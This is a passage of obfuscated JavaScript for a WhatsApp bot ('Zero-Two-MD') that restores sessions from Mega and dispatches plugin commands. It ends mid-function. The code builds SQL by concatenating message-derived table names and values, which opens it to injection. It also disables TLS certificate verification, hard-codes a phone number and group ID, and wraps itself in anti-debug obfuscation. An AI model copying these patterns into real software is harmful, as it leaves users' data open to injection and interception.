const _0x3e3795 = (function () {
    let _0x190c25 = true
    return function (_0x760f5e, _0x26e3c8) {
      const _0x5158f2 = _0x190c25
        ? function () {
            if (_0x26e3c8) {
              const _0x5c1a6b = _0x26e3c8.apply(_0x760f5e, arguments)
              return (_0x26e3c8 = null), _0x5c1a6b
            }
          }
        : function () {}
      return (_0x190c25 = false), _0x5158f2
    }
  })(),
  _0x465a10 = _0x3e3795(this, function () {
    return _0x465a10
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x465a10)
      .search('(((.+)+)+)+$')
  })
_0x465a10()
const _0x5b8e2b = (function () {
  let _0x5d6edd = true
  return function (_0x9b681, _0x530ee4) {
    const _0x33899a = _0x5d6edd
      ? function () {
          if (_0x530ee4) {
            const _0x57f3cb = _0x530ee4.apply(_0x9b681, arguments)
            return (_0x530ee4 = null), _0x57f3cb
          }
        }
      : function () {}
    return (_0x5d6edd = false), _0x33899a
  }
})()
;(function () {
  _0x5b8e2b(this, function () {
    const _0x482827 = new RegExp('function *\\( *\\)'),
      _0x1cf80b = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      _0xe8d155 = _0x466f77('init')
    if (
      !_0x482827.test(_0xe8d155 + 'chain') ||
      !_0x1cf80b.test(_0xe8d155 + 'input')
    ) {
      _0xe8d155('0')
    } else {
      _0x466f77()
    }
  })()
})()
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
  } = require('@adiwajshing/baileys'),
  fs = require('fs')
const P = require('pino'),
  config = require('./config'),
  qrcode = require('qrcode-terminal'),
  NodeCache = require('node-cache'),
  util = require('util')
;(function () {
  let _0x4820f9
  try {
    const _0x5c1626 = Function(
      'return (function() {}.constructor("return this")( ));'
    )
    _0x4820f9 = _0x5c1626()
  } catch (_0x20697d) {
    _0x4820f9 = window
  }
  _0x4820f9.setInterval(_0x466f77, 4000)
})()
const {
    getBuffer,
    getGroupAdmins,
    getRandom,
    h2k,
    isUrl,
    Json,
    runtime,
    sleep,
    fetchJson,
    fetchBuffer,
    getFile,
  } = require('./lib/functions'),
  { sms, downloadMediaMessage } = require('./lib/msg'),
  axios = require('axios')
const { File } = require('megajs'),
  msgRetryCounterCache = new NodeCache(),
  prefix = '.',
  ownerNumber = ['94762898541'],
  l = console.log,
  url = config.POSTGRESQL_URL,
  { Pool } = require('pg')
require('pg-pool')
const _0xabe36a = {}
_0xabe36a.rejectUnauthorized = false
const _0x4fa3b4 = {}
_0x4fa3b4.connectionString = url
_0x4fa3b4.ssl = _0xabe36a
const proConfig = _0x4fa3b4,
  pool = new Pool(proConfig)
async function updateCMDStore(_0x23006e, _0x234792) {
  try {
    return (
      await pool.query(
        'CREATE TABLE IF NOT EXISTS ' + _0x23006e + '(CMD varchar)'
      ),
      await pool.query(
        'insert into ' +
          _0x23006e +
          " values('" +
          JSON.stringify(_0x234792) +
          "')"
      ),
      true
    )
  } catch (_0x2044e1) {
    return console.log(_0x2044e1), false
  }
}
async function isbtnID(_0x35e191) {
  try {
    var _0xeee620 = await pool.query('select * from ' + _0x35e191)
    if (_0xeee620) {
      return true
    }
  } catch (_0x2a0ed9) {
    return false
  }
}
async function getCMDStore(_0x1724a2) {
  try {
    var _0x675362 = await pool.query('select * from ' + _0x1724a2)
    return JSON.parse(_0x675362.rows[0].cmd)
  } catch (_0x5520cf) {
    return console.log(_0x5520cf), false
  }
}
function getCmdForCmdId(_0x130f1c, _0x251821) {
  const _0xdb9cc = _0x130f1c.find((_0x15629c) => _0x15629c.cmdId === _0x251821)
  return _0xdb9cc ? _0xdb9cc.cmd : null
}
async function delete_id(_0x299acb) {
  try {
    return await pool.query('drop table ' + _0x299acb), true
  } catch (_0x153dc9) {
    if (_0x153dc9 + ''.includes('does not exist')) {
      return true
    }
    return console.log(_0x153dc9), false
  }
}
if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
  if (config.SESSION_ID) {
    const sessdata = config.SESSION_ID.replace('ZEROTWO=', ''),
      filer = File.fromURL('https://mega.nz/file/' + sessdata)
    filer.download((_0x1f91b1, _0x1c6305) => {
      if (_0x1f91b1) {
        throw _0x1f91b1
      }
      fs.writeFile(
        __dirname + '/auth_info_baileys/creds.json',
        _0x1c6305,
        () => {
          console.log('Session download completed !!')
        }
      )
    })
  }
}
const express = require('express'),
  app = express(),
  port = process.env.PORT || 8000
async function connectToWA() {
  const { version: _0x21227a, isLatest: _0xbec0f8 } =
    await fetchLatestBaileysVersion()
  console.log('using WA v' + _0x21227a.join('.') + ', isLatest: ' + _0xbec0f8)
  const { state: _0x2fb1c7, saveCreds: _0x36636a } =
      await useMultiFileAuthState(__dirname + '/auth_info_baileys/'),
    _0x56b9b6 = makeWASocket({
      logger: P({ level: 'fatal' }).child({ level: 'fatal' }),
      printQRInTerminal: true,
      generateHighQualityLinkPreview: true,
      auth: _0x2fb1c7,
      defaultQueryTimeoutMs: undefined,
      msgRetryCounterCache: msgRetryCounterCache,
    })
  _0x56b9b6.ev.on('connection.update', (_0x4d16e3) => {
    const { connection: _0x1feb31, lastDisconnect: _0x3fb47d } = _0x4d16e3
    if (_0x1feb31 === 'close') {
      if (_0x3fb47d.error.output.statusCode !== DisconnectReason.loggedOut) {
        connectToWA()
      }
    } else {
      if (_0x1feb31 === 'open') {
        console.log('Installing plugins \uD83D\uDD0C... ')
        const _0x235047 = require('path')
        fs.readdirSync('./plugins/').forEach((_0x183840) => {
          _0x235047.extname(_0x183840).toLowerCase() == '.js' &&
            require('./plugins/' + _0x183840)
        })
        console.log('Plugins installed \u2705')
        console.log('Zero-Two-MD connected \u2705')
      }
    }
  })
  _0x56b9b6.ev.on('creds.update', _0x36636a)
  _0x56b9b6.ev.on('messages.upsert', async (_0xc100b) => {
    try {
      _0xc100b = _0xc100b.messages[0]
      if (!_0xc100b.message) {
        return
      }
      _0xc100b.message =
        getContentType(_0xc100b.message) === 'ephemeralMessage'
          ? _0xc100b.message.ephemeralMessage.message
          : _0xc100b.message
      if (_0xc100b.key && _0xc100b.key.remoteJid === 'status@broadcast') {
        return
      }
      const _0x47bec8 = sms(_0x56b9b6, _0xc100b),
        _0xdd34ef = getContentType(_0xc100b.message),
        _0x560a4d = JSON.stringify(_0xc100b.message),
        _0x3ae3fc = _0xc100b.key.remoteJid,
        _0x4ee907 =
          _0xdd34ef == 'extendedTextMessage' &&
          _0xc100b.message.extendedTextMessage.contextInfo != null
            ? _0xc100b.message.extendedTextMessage.contextInfo.quotedMessage ||
              []
            : [],
        _0x331d01 =
          _0xdd34ef === 'conversation'
            ? _0xc100b.message.conversation
            : _0xc100b.message?.extendedTextMessage?.contextInfo?.hasOwnProperty(
                'quotedMessage'
              ) &&
              (await isbtnID(
                _0xc100b.message?.extendedTextMessage?.contextInfo?.stanzaId
              )) &&
              getCmdForCmdId(
                await getCMDStore(
                  _0xc100b.message?.extendedTextMessage?.contextInfo?.stanzaId
                ),
                _0xc100b?.message?.extendedTextMessage?.text
              )
            ? getCmdForCmdId(
                await getCMDStore(
                  _0xc100b.message?.extendedTextMessage?.contextInfo?.stanzaId
                ),
                _0xc100b?.message?.extendedTextMessage?.text
              )
            : _0xdd34ef === 'extendedTextMessage'
            ? _0xc100b.message.extendedTextMessage.text
            : _0xdd34ef == 'imageMessage' &&
              _0xc100b.message.imageMessage.caption
            ? _0xc100b.message.imageMessage.caption
            : _0xdd34ef == 'videoMessage' &&
              _0xc100b.message.videoMessage.caption
            ? _0xc100b.message.videoMessage.caption
            : '',
        _0x57d0b8 = _0x331d01.startsWith(prefix),
        _0x2fb520 = _0x57d0b8
          ? _0x331d01
              .slice(prefix.length)
              .trim()
              .split(' ')
              .shift()
              .toLowerCase()
          : '',
        _0xa453d = _0x331d01.trim().split(/ +/).slice(1),
        _0x4ed6ba = _0xa453d.join(' '),
        _0x5684d3 = _0x3ae3fc.endsWith('@g.us'),
        _0x572fae = _0xc100b.key.fromMe
          ? _0x56b9b6.user.id.split(':')[0] + '@s.whatsapp.net' ||
            _0x56b9b6.user.id
          : _0xc100b.key.participant || _0xc100b.key.remoteJid,
        _0x7bd83b = _0x572fae.split('@')[0],
        _0x497fd2 = _0x56b9b6.user.id.split(':')[0],
        _0x93acd9 = _0xc100b.pushName || 'Sin Nombre',
        _0x175ddd = '94762898541',
        _0x2fba21 = _0x497fd2.includes(_0x7bd83b),
        _0x1bb46b = _0x175ddd.includes(_0x7bd83b),
        _0xb1ccdb = _0x2fba21 ? _0x2fba21 : _0x1bb46b,
        _0x1e02c1 = ownerNumber.includes(_0x7bd83b) || _0xb1ccdb,
        _0x2fbe83 = await jidNormalizedUser(_0x56b9b6.user.id),
        _0x5e0dbf = _0x5684d3
          ? await _0x56b9b6.groupMetadata(_0x3ae3fc).catch((_0x11a936) => {})
          : '',
        _0x2cb5ae = _0x5684d3 ? _0x5e0dbf.subject : '',
        _0x1ff443 = _0x5684d3 ? await _0x5e0dbf.participants : '',
        _0x24a813 = _0x5684d3 ? await getGroupAdmins(_0x1ff443) : '',
        _0x2e3e9d = _0x5684d3 ? _0x24a813.includes(_0x2fbe83) : false,
        _0x367af6 = _0x5684d3 ? _0x24a813.includes(_0x572fae) : false,
        _0x15806e = (_0xbbbf51) => {
          const _0x1e99d3 = { text: _0xbbbf51 }
          const _0x56016b = {}
          return (
            (_0x56016b.quoted = _0xc100b),
            _0x56b9b6.sendMessage(_0x3ae3fc, _0x1e99d3, _0x56016b)
          )
        }
      _0x56b9b6.replyad = async (_0x5d0a41) => {
        const _0x527682 = {
          title:
            '\uD835\uDDED\uD835\uDDF2\uD835\uDDFF\uD835\uDDFC-\uD835\uDDE7\uD835\uDDEA\uD835\uDDE2 \uD835\uDDE0\uD835\uDDD7 \uD83C\uDF6D',
          body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
          mediaType: 1,
          sourceUrl: 'https://zerotwomd.me/',
          thumbnailUrl:
            'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg',
          renderLargerThumbnail: false,
          showAdAttribution: true,
        }
        const _0x4c3952 = { externalAdReply: _0x527682 }
        const _0x27a052 = {
          text: _0x5d0a41,
          contextInfo: _0x4c3952,
        }
        const _0x51747c = {}
        return (
          (_0x51747c.quoted = _0xc100b),
          _0x56b9b6.sendMessage(_0x3ae3fc, _0x27a052, _0x51747c)
        )
      }
      _0x56b9b6.buttonMessage2 = async (_0x208dbb, _0x1820ef, _0x51020e) => {
        let _0x14b9b5 = ''
        const _0x4418e0 = []
        _0x1820ef.buttons.forEach((_0x4788df, _0x4b1b92) => {
          const _0x5321d7 = '' + (_0x4b1b92 + 1)
          _0x14b9b5 +=
            '\n*' + _0x5321d7 + ' | ' + _0x4788df.buttonText.displayText + '*\n'
          const _0x123423 = {
            cmdId: _0x5321d7,
            cmd: _0x4788df.buttonId,
          }
          _0x4418e0.push(_0x123423)
        })
        if (_0x1820ef.headerType === 1) {
          const _0x846785 =
              _0x1820ef.text +
              '\n\n\uD83D\uDD22 Reply below number,' +
              _0x14b9b5 +
              '\n\n' +
              _0x1820ef.footer,
            _0x4e5b42 = {
              title:
                '\uD835\uDDED\uD835\uDDF2\uD835\uDDFF\uD835\uDDFC-\uD835\uDDE7\uD835\uDDEA\uD835\uDDE2 \uD835\uDDE0\uD835\uDDD7 \uD83C\uDF6D',
              body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
              mediaType: 1,
              sourceUrl: 'https://zerotwomd.me/',
              thumbnailUrl:
                'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg',
              renderLargerThumbnail: false,
              showAdAttribution: true,
            }
          const _0x3cd72f = { externalAdReply: _0x4e5b42 }
          const _0x146b6b = {
            text: _0x846785,
            contextInfo: _0x3cd72f,
          }
          const _0x497115 = await _0x56b9b6.sendMessage(_0x3ae3fc, _0x146b6b, {
            quoted: _0x51020e || _0xc100b,
          })
          await updateCMDStore(_0x497115.key.id, _0x4418e0)
        } else {
          if (_0x1820ef.headerType === 4) {
            const _0x5db89a =
                _0x1820ef.caption +
                '\n\n\uD83D\uDD22 Reply below number,' +
                _0x14b9b5 +
                '\n\n' +
                _0x1820ef.footer,
              _0x5b00c6 = {
                title:
                  '\uD835\uDDED\uD835\uDDF2\uD835\uDDFF\uD835\uDDFC-\uD835\uDDE7\uD835\uDDEA\uD835\uDDE2 \uD835\uDDE0\uD835\uDDD7 \uD83C\uDF6D',
                body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
                mediaType: 1,
                sourceUrl: 'https://zerotwomd.me/',
                thumbnailUrl:
                  'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg',
                renderLargerThumbnail: false,
                showAdAttribution: true,
              }
            const _0x8cf621 = { externalAdReply: _0x5b00c6 }
            const _0x3aaeaa = {
              image: _0x1820ef.image,
              caption: _0x5db89a,
              contextInfo: _0x8cf621,
            }
            const _0x5a7fe5 = await _0x56b9b6.sendMessage(
              _0x208dbb,
              _0x3aaeaa,
              { quoted: _0x51020e || _0xc100b }
            )
            await updateCMDStore(_0x5a7fe5.key.id, _0x4418e0)
          }
        }
      }
      _0x56b9b6.buttonMessage = async (_0x1f3bfd, _0x33b121, _0x1ca17a) => {
        let _0x3ade84 = ''
        const _0x38d01a = []
        _0x33b121.buttons.forEach((_0x58d48b, _0x43b2db) => {
          const _0x49531b = '' + (_0x43b2db + 1)
          _0x3ade84 +=
            '\n*' + _0x49531b + ' | ' + _0x58d48b.buttonText.displayText + '*\n'
          const _0x47e6d9 = {
            cmdId: _0x49531b,
            cmd: _0x58d48b.buttonId,
          }
          _0x38d01a.push(_0x47e6d9)
        })
        if (_0x33b121.headerType === 1) {
          const _0x2ca71f =
              (_0x33b121.text || _0x33b121.caption) +
              '\n\n\uD83D\uDD22 Reply below number,' +
              _0x3ade84 +
              '\n\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25C9\n\n' +
              _0x33b121.footer,
            _0x2594f9 = {
              title:
                '\uD835\uDDED\uD835\uDDF2\uD835\uDDFF\uD835\uDDFC-\uD835\uDDE7\uD835\uDDEA\uD835\uDDE2 \uD835\uDDE0\uD835\uDDD7 \uD83C\uDF6D',
              body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
              mediaType: 1,
              sourceUrl: 'https://zerotwomd.me/',
              thumbnailUrl:
                'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg',
              renderLargerThumbnail: false,
              showAdAttribution: true,
            }
          const _0x27ce8f = { externalAdReply: _0x2594f9 }
          const _0x19549a = {
            text: _0x2ca71f,
            contextInfo: _0x27ce8f,
          }
          const _0xbc06f4 = await _0x56b9b6.sendMessage(_0x3ae3fc, _0x19549a, {
            quoted: _0x1ca17a || _0xc100b,
          })
          await updateCMDStore(_0xbc06f4.key.id, _0x38d01a)
        } else {
          if (_0x33b121.headerType === 4) {
            const _0x2ef630 =
                _0x33b121.caption +
                '\n\n\uD83D\uDD22 Reply below number,' +
                _0x3ade84 +
                '\n\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25C9\n\n' +
                _0x33b121.footer,
              _0x354e15 = {
                title:
                  '\uD835\uDDED\uD835\uDDF2\uD835\uDDFF\uD835\uDDFC-\uD835\uDDE7\uD835\uDDEA\uD835\uDDE2 \uD835\uDDE0\uD835\uDDD7 \uD83C\uDF6D',
                body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
                mediaType: 1,
                sourceUrl: 'https://zerotwomd.me/',
                thumbnailUrl:
                  'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg',
                renderLargerThumbnail: false,
                showAdAttribution: true,
              }
            const _0x35532e = { externalAdReply: _0x354e15 }
            const _0x2730a4 = {
              image: _0x33b121.image,
              caption: _0x2ef630,
              contextInfo: _0x35532e,
            }
            const _0x185e2c = await _0x56b9b6.sendMessage(
              _0x1f3bfd,
              _0x2730a4,
              { quoted: _0x1ca17a || _0xc100b }
            )
            await updateCMDStore(_0x185e2c.key.id, _0x38d01a)
          }
        }
      }
      _0x56b9b6.listMessage2 = async (_0x4b2b4a, _0x367382, _0x543ce6) => {
        let _0x1ed7ce = ''
        const _0x12b987 = []
        _0x367382.sections.forEach((_0x4b5b14, _0x3c84cd) => {
          const _0x5ac072 = '' + (_0x3c84cd + 1)
          _0x1ed7ce += '\n*[' + _0x5ac072 + '] ' + _0x4b5b14.title + '*\n'
          _0x4b5b14.rows.forEach((_0x2135df, _0x2399d9) => {
            const _0x58ec20 = _0x5ac072 + '.' + (_0x2399d9 + 1),
              _0x1780d1 = '   ' + _0x58ec20 + ' | ' + _0x2135df.title
            _0x1ed7ce += _0x1780d1 + '\n'
            if (_0x2135df.description) {
              _0x1ed7ce += '   ' + _0x2135df.description + '\n\n'
            }
            const _0x4b3c54 = {
              cmdId: _0x58ec20,
              cmd: _0x2135df.rowId,
            }
            _0x12b987.push(_0x4b3c54)
          })
        })
        const _0x9e90ac =
            _0x367382.text +
            '\n\n' +
            _0x367382.buttonText +
            ',' +
            _0x1ed7ce +
            '\n' +
            _0x367382.footer,
          _0x3f16a7 = {
            title:
              '\uD835\uDDED\uD835\uDDF2\uD835\uDDFF\uD835\uDDFC-\uD835\uDDE7\uD835\uDDEA\uD835\uDDE2 \uD835\uDDE0\uD835\uDDD7 \uD83C\uDF6D',
            body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
            mediaType: 1,
            sourceUrl: 'https://zerotwomd.me/',
            thumbnailUrl:
              'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg',
            renderLargerThumbnail: false,
            showAdAttribution: true,
          }
        const _0x262499 = { externalAdReply: _0x3f16a7 }
        const _0x40356d = {
          text: _0x9e90ac,
          contextInfo: _0x262499,
        }
        const _0x1dd6ed = await _0x56b9b6.sendMessage(_0x3ae3fc, _0x40356d, {
          quoted: _0x543ce6 || _0xc100b,
        })
        await updateCMDStore(_0x1dd6ed.key.id, _0x12b987)
      }
      _0x56b9b6.listMessage = async (_0x10f0e9, _0x4b78de, _0x4467bb) => {
        let _0x271b3a = ''
        const _0x5ed874 = []
        _0x4b78de.sections.forEach((_0x44553f, _0x1d2f7b) => {
          const _0x79338b = '' + (_0x1d2f7b + 1)
          _0x271b3a += '\n*[' + _0x79338b + '] ' + _0x44553f.title + '*\n'
          _0x44553f.rows.forEach((_0x5a69d7, _0x7bcd93) => {
            const _0x1d5d04 = _0x79338b + '.' + (_0x7bcd93 + 1),
              _0x5862a7 = '   ' + _0x1d5d04 + ' | ' + _0x5a69d7.title
            _0x271b3a += _0x5862a7 + '\n'
            _0x5a69d7.description &&
              (_0x271b3a += '   ' + _0x5a69d7.description + '\n\n')
            const _0x37619b = {
              cmdId: _0x1d5d04,
              cmd: _0x5a69d7.rowId,
            }
            _0x5ed874.push(_0x37619b)
          })
        })
        const _0x1d4b57 =
            _0x4b78de.text +
            '\n\n' +
            _0x4b78de.buttonText +
            ',' +
            _0x271b3a +
            '\n\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25C9\n\n' +
            _0x4b78de.footer,
          _0x36f4ae = {
            title:
              '\uD835\uDDED\uD835\uDDF2\uD835\uDDFF\uD835\uDDFC-\uD835\uDDE7\uD835\uDDEA\uD835\uDDE2 \uD835\uDDE0\uD835\uDDD7 \uD83C\uDF6D',
            body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
            mediaType: 1,
            sourceUrl: 'https://zerotwomd.me/',
            thumbnailUrl:
              'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg',
            renderLargerThumbnail: false,
            showAdAttribution: true,
          }
        const _0x3fad1b = { externalAdReply: _0x36f4ae }
        const _0x270b2a = {
          text: _0x1d4b57,
          contextInfo: _0x3fad1b,
        }
        const _0x35f7ad = await _0x56b9b6.sendMessage(_0x3ae3fc, _0x270b2a, {
          quoted: _0x4467bb || _0xc100b,
        })
        await updateCMDStore(_0x35f7ad.key.id, _0x5ed874)
      }
      _0x56b9b6.edite = async (_0x495b39, _0x33c716) => {
        const _0x3ddb48 = { conversation: _0x33c716 }
        const _0x4cee60 = {
          key: _0x495b39.key,
          type: 14,
          editedMessage: _0x3ddb48,
        }
        const _0x2cff08 = { protocolMessage: _0x4cee60 }
        await _0x56b9b6.relayMessage(_0x3ae3fc, _0x2cff08, {})
      }
      _0x56b9b6.sendFileUrl = async (
        _0x2797be,
        _0x5e00cc,
        _0x10fb41,
        _0x13744d,
        _0x116c8f = {}
      ) => {
        let _0x2c12b0 = '',
          _0x33a54c = await axios.head(_0x5e00cc)
        _0x2c12b0 = _0x33a54c.headers['content-type']
        if (_0x2c12b0.split('/')[1] === 'gif') {
          return _0x56b9b6.sendMessage(
            _0x2797be,
            {
              video: await getBuffer(_0x5e00cc),
              caption: _0x10fb41,
              gifPlayback: true,
              ..._0x116c8f,
            },
            {
              quoted: _0x13744d,
              ..._0x116c8f,
            }
          )
        }
        let _0x69700e = _0x2c12b0.split('/')[0] + 'Message'
        if (_0x2c12b0 === 'application/pdf') {
          return _0x56b9b6.sendMessage(
            _0x2797be,
            {
              document: await getBuffer(_0x5e00cc),
              mimetype: 'application/pdf',
              caption: _0x10fb41,
              ..._0x116c8f,
            },
            {
              quoted: _0x13744d,
              ..._0x116c8f,
            }
          )
        }
        if (_0x2c12b0.split('/')[0] === 'image') {
          return _0x56b9b6.sendMessage(
            _0x2797be,
            {
              image: await getBuffer(_0x5e00cc),
              caption: _0x10fb41,
              ..._0x116c8f,
            },
            {
              quoted: _0x13744d,
              ..._0x116c8f,
            }
          )
        }
        if (_0x2c12b0.split('/')[0] === 'video') {
          return _0x56b9b6.sendMessage(
            _0x2797be,
            {
              video: await getBuffer(_0x5e00cc),
              caption: _0x10fb41,
              mimetype: 'video/mp4',
              ..._0x116c8f,
            },
            {
              quoted: _0x13744d,
              ..._0x116c8f,
            }
          )
        }
        if (_0x2c12b0.split('/')[0] === 'audio') {
          return _0x56b9b6.sendMessage(
            _0x2797be,
            {
              audio: await getBuffer(_0x5e00cc),
              caption: _0x10fb41,
              mimetype: 'audio/mpeg',
              ..._0x116c8f,
            },
            {
              quoted: _0x13744d,
              ..._0x116c8f,
            }
          )
        }
      }
      if (!_0xb1ccdb && !_0x5684d3 && config.ONLY_GROUP == 'true') {
        return
      }
      if (_0x3ae3fc === '120363043598019970@g.us' && !_0x1bb46b) {
        return
      }
      const _0xd5791d = require('./command'),
        _0x1ceecc = _0x57d0b8
          ? _0x331d01.slice(1).trim().split(' ')[0].toLowerCase()
          : false
      if (_0x57d0b8) {
        const _0x56e412 =
          _0xd5791d.commands.find(
            (_0x324807) => _0x324807.pattern === _0x1ceecc
          ) ||
          _0xd5791d.commands.find(
            (_0x46366c) =>
              _0x46366c.alias && _0x46366c.alias.includes(_0x1ceecc)
          )
        if (_0x56e412) {
          if (_0x56e412.react) {
            _0x56b9b6.sendMessage(_0x3ae3fc, {
              react: {
                text: _0x56e412.react,
                key: _0xc100b.key,
              },
            })
          }
          try {
            const _0x4a38a2 = {
              from: _0x3ae3fc,
              prefix: prefix,
              l: l,
              quoted: _0x4ee907,
              body: _0x331d01,
              isCmd: _0x57d0b8,
              command: _0x2fb520,
              args: _0xa453d,
              q: _0x4ed6ba,
              isGroup: _0x5684d3,
              sender: _0x572fae,
              senderNumber: _0x7bd83b,
              botNumber2: _0x2fbe83,
              botNumber: _0x497fd2,
              pushname: _0x93acd9,
              isMe: _0xb1ccdb,
              isOwner: _0x1e02c1,
              groupMetadata: _0x5e0dbf,
              groupName: _0x2cb5ae,
              participants: _0x1ff443,
              groupAdmins: _0x24a813,
              isBotAdmins: _0x2e3e9d,
              isAdmins: _0x367af6,
              reply: _0x15806e,
            }
            _0x56e412.function(_0x56b9b6, _0xc100b, _0x47bec8, _0x4a38a2)
          } catch (_0x226060) {
            console.error('[PLUGIN ERROR] ', _0x226060)
          }
        }
      }
      _0xd5791d.commands.map(async (_0x666ed8) => {
        if (_0x331d01 && _0x666ed8.on === 'body') {
          _0x666ed8.function(_0x56b9b6, _0xc100b, _0x47bec8, {
            from: _0x3ae3fc,
            prefix: prefix,
            l: l,
            quoted: _0x4ee907,
            body: _0x331d01,
            isCmd: _0x57d0b8,
            command: _0x666ed8,
            args: _0xa453d,
            q: _0x4ed6ba,
            isGroup: _0x5684d3,
            sender: _0x572fae,
            senderNumber: _0x7bd83b,
            botNumber2: _0x2fbe83,
            botNumber: _0x497fd2,
            pushname: _0x93acd9,
            isMe: _0xb1ccdb,
            isOwner: _0x1e02c1,
            groupMetadata: _0x5e0dbf,
            groupName: _0x2cb5ae,
            participants: _0x1ff443,
            groupAdmins: _0x24a813,
            isBotAdmins: _0x2e3e9d,
            isAdmins: _0x367af6,
            reply: _0x15806e,
          })
        } else {
          if (_0xc100b.q && _0x666ed8.on === 'text') {
            _0x666ed8.function(_0x56b9b6, _0xc100b, _0x47bec8, {
              from: _0x3ae3fc,
              l: l,
              quoted: _0x4ee907,
              body: _0x331d01,
              isCmd: _0x57d0b8,
              command: _0x666ed8,
              args: _0xa453d,
              q: _0x4ed6ba,
              isGroup: _0x5684d3,
              sender: _0x572fae,
              senderNumber: _0x7bd83b,
              botNumber2: _0x2fbe83,
              botNumber: _0x497fd2,
              pushname: _0x93acd9,
              isMe: _0xb1ccdb,
              isOwner: _0x1e02c1,
              groupMetadata: _0x5e0dbf,
              groupName: _0x2cb5ae,
              participants: _0x1ff443,
              groupAdmins: _0x24a813,
              isBotAdmins: _0x2e3e9d,
              isAdmins: _0x367af6,
              reply: _0x15806e,
            })
          } else {
            if (
              (_0x666ed8.on === 'image' || _0x666ed8.on === 'photo') &&
              _0xc100b.type === 'imageMessage'
            ) {
              _0x666ed8.function(_0x56b9b6, _0xc100b, _0x47bec8, {
                from: _0x3ae3fc,
                prefix: prefix,
                l: l,
                quoted: _0x4ee907,
                body: _0x331d01,
                isCmd: _0x57d0b8,
                command: _0x666ed8,
                args: _0xa453d,
                q: _0x4ed6ba,
                isGroup: _0x5684d3,
                sender: _0x572fae,
                senderNumber: _0x7bd83b,
                botNumber2: _0x2fbe83,
                botNumber: _0x497fd2,
                pushname: _0x93acd9,
                isMe: _0xb1ccdb,
                isOwner: _0x1e02c1,
                groupMetadata: _0x5e0dbf,
                groupName: _0x2cb5ae,
                participants: _0x1ff443,
                groupAdmins: _0x24a813,
                isBotAdmins: _0x2e3e9d,
                isAdmins: _0x367af6,
                reply: _0x15806e,
              })
            } else {
              if (
                _0x666ed8.on === 'sticker' &&
                _0xc100b.type === 'stickerMessage'
              ) {
                _0x666ed8.function(_0x56b9b6, _0xc100b, _0x47bec8, {
                  from: _0x3ae3fc,
                  prefix: prefix,
                  l: l,
                  quoted: _0x4ee907,
                  body: _0x331d01,
                  isCmd: _0x57d0b8,
                  command: _0x666ed8,
                  args: _0xa453d,
                  q: _0x4ed6ba,
                  isGroup: _0x5684d3,
                  sender: _0x572fae,
                  senderNumber: _0x7bd83b,
                  botNumber2: _0x2fbe83,
                  botNumber: _0x497fd2,
                  pushname: _0x93acd9,
                  isMe: _0xb1ccdb,
                  isOwner: _0x1e02c1,
                  groupMetadata: _0x5e0dbf,
                  groupName: _0x2cb5ae,
                  participants: _0x1ff443,
                  groupAdmins: _0x24a813,
                  isBotAdmins: _0x2e3e9d,
                  isAdmins: _0x367af6,
                  reply: _0x15806e,
                })
              }
            }
          }
        }
      })
      if (config.ANTI_LINK == 'true' && !_0xb1ccdb) {
        if (_0x331d01.match('chat.whatsapp.com')) {
          if (_0x24a813.includes(_0x572fae)) {
            return
          }
          const _0x3cc195 = { delete: _0xc100b.key }
          await _0x56b9b6.sendMessage(_0x3ae3fc, _0x3cc195)
        }
      }
      var _0x594134 = [
        'badtest',
        'رقص صاخن',
        'porno',
        'porn',
        'xxn',
        'pono',
        'fack',
        'nude',
        'nappi',
        'doch',
        'xnxn',
        'khalifa',
        'kalifa',
        'زب',
        'xxx',
        'cum',
        'pussy',
        'prono',
        'fuck',
        'sex',
        'pronhub',
        'xnxx',
        'pakaya',
        'ponnaya',
        'huththa',
        'පොන්නයා',
        'පකයා',
        'පක',
        'වේස',
        'හුක',
        'paka',
        'huka',
        'wesa',
        'ponna',
        'wesi',
        'kariya',
        'pinnaya',
        'HUKA',
        'කැරි',
        'පුක',
        'Huka',
        'pamkaya',
        'පම්කයා',
      ]
      if (config.ANTI_BAD == 'true' && _0x2e3e9d) {
        if (!_0x367af6) {
          for (any in _0x594134) {
            if (_0x331d01.toLowerCase().includes(_0x594134[any])) {
              if (!_0x331d01.includes('tent')) {
                if (!_0x331d01.includes('docu')) {
                  if (!_0x331d01.includes('https')) {
                    if (_0x24a813.includes(_0x572fae)) {
                      return
                    }
                    if (_0xc100b.key.fromMe) {
                      return
                    }
                    const _0x54fce5 = {}
